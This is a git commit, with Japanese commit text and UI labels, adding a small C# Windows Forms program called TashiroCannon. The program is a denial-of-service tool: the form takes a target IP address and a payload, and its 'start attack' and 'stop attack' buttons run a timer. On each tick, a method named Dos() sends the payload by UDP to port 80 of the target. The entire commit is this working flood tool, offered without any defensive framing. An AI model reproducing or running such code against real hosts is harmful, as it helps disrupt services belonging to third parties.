faf2224c78c1ae7d65b1786498652a95ba21bf40
furuk <furuk@YOSHITO>
2024-05-16 20:48:49 +0900

    プロジェクト ファイルを追加します。

---
+++ TashiroCannon/Form1.Designer.cs
@@ -0,0 +1,130 @@
+﻿namespace TashiroCannon
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必要なデザイナー変数です。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 使用中のリソースをすべてクリーンアップします。
+        /// </summary>
+        /// <param name="disposing">マネージド リソースを破棄する場合は true を指定し、その他の場合は false を指定します。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows フォーム デザイナーで生成されたコード
+
+        /// <summary>
+        /// デザイナー サポートに必要なメソッドです。このメソッドの内容を
+        /// コード エディターで変更しないでください。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.iptxt = new System.Windows.Forms.TextBox();
+            this.datatxt = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("ＭＳ ゴシック", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
+            this.label1.Location = new System.Drawing.Point(90, 60);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(236, 24);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "田代砲ターゲットIP";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("ＭＳ ゴシック", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
+            this.label2.Location = new System.Drawing.Point(90, 170);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(135, 24);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "送るデータ";
+            // 
+            // iptxt
+            // 
+            this.iptxt.Location = new System.Drawing.Point(422, 65);
+            this.iptxt.Name = "iptxt";
+            this.iptxt.Size = new System.Drawing.Size(212, 19);
+            this.iptxt.TabIndex = 2;
+            // 
+            // datatxt
+            // 
+            this.datatxt.Location = new System.Drawing.Point(422, 175);
+            this.datatxt.Multiline = true;
+            this.datatxt.Name = "datatxt";
+            this.datatxt.Size = new System.Drawing.Size(212, 85);
+            this.datatxt.TabIndex = 3;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(422, 323);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(90, 63);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "攻撃開始";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(544, 323);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(90, 63);
+            this.button2.TabIndex = 5;
+            this.button2.Text = "攻撃終了";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // timer1
+            // 
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.datatxt);
+            this.Controls.Add(this.iptxt);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox iptxt;
+        private System.Windows.Forms.TextBox datatxt;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Timer timer1;
+    }
+}
+
---
+++ TashiroCannon/Form1.cs
@@ -0,0 +1,61 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+
+namespace TashiroCannon
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            Dos();
+        }
+
+        public void Dos()
+        {
+            UdpClient client = new UdpClient();
+            IPAddress ip = IPAddress.Parse(iptxt.Text);
+
+            try
+            {
+                client. Connect(ip,80);
+                byte[] sendbytes = Encoding.ASCII.GetBytes(datatxt.Text);
+                client.Send(sendbytes, sendbytes.Length);
+                client.AllowNatTraversal(true);
+                client.DontFragment = true;
+            }
+            catch
+            {
+                MessageBox.Show("");
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            timer1.Start();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            timer1.Stop();
+        }
+    }
+}
